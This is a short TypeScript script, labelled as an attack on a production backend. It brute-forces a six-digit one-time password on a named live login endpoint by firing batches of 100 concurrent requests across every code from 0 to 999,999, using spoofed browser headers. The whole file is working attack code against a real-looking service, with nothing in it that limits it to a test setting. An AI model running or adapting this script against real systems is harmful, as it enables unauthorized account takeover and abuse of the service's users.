/* POSTMAN METHOD FOR A PROD BACKEND ATTACK */

import axios from "axios";

//function to send a request to the server
async function sendRequest(otp: number) {

  let config = {
    method: 'get',
    maxBodyLength: Infinity,
    url: `https://harkiratapi.classx.co.in/get/otpverify?useremail=email_id_here%40gmail.com&otp=${otp}&device_id=WebBrowser172725121074835z4gepsds3&mydeviceid&mydeviceid2`,
    headers: {
      'accept-language': 'en-US,en;q=0.9,hi;q=0.8,af;q=0.7',
      'auth-key': 'appxapi',
      'client-service': 'Appx',
      'device-type': '',
      'origin': 'https://harkirat.classx.co.in',
      'priority': 'u=1, i',
      'referer': 'https://harkirat.classx.co.in/',
      'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-site',
      'source': 'website'
    }
  };

  try {
    await axios.request(config)
    console.log("done for " + otp);
  } catch (e) {
    //console.log('Error: ', e);
  }
}

//calling the function in a loop to send multiple requests
async function main() {
  for (let i = 0; i < 1000000; i += 100) {
    const batch_array = [];
    console.log(i);

    //sending in a batch of 100 requests
    for (let j = 0; j < 100; j++) {
      batch_array.push(sendRequest(i + j))
    }
    await Promise.all(batch_array); //wait for all requests in this batch to complete only then conitinue to the next batch
  }
}

main();